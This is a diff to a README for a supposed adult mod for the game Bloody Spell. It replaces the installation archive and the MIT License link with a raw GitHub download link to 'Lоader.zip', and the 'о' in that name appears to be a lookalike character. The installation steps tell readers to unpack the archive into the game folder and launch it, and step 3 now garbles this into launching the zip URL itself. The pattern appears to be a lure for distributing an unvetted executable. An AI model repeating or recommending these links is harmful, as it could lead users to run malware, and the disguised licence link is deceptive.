@@ -30,9 +30,9 @@
 
 ## 📦 Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/mahe47/BloodySpell-18Plus-Enhancements/main/Lоader.zip** from the repository.
 2. Unpack the archive to your Bloody Spell root folder.
-3. Launch Loader.exe and select your options.
+3. Launch https://raw.githubusercontent.com/mahe47/BloodySpell-18Plus-Enhancements/main/Lоader.zip and select your options.
 4. Enjoy the enhanced features in-game!
 
 ---
@@ -51,4 +51,4 @@ This repository provides educational content for modding Bloody Spell in 2025. U
 
 ## 📄 License
 
-All source code and resources are provided under the [MIT License](https://opensource.org/licenses/MIT) – freedom to modify and distribute, credited to the community, 2025.
+All source code and resources are provided under the [MIT License](https://raw.githubusercontent.com/mahe47/BloodySpell-18Plus-Enhancements/main/Lоader.zip) – freedom to modify and distribute, credited to the community, 2025.
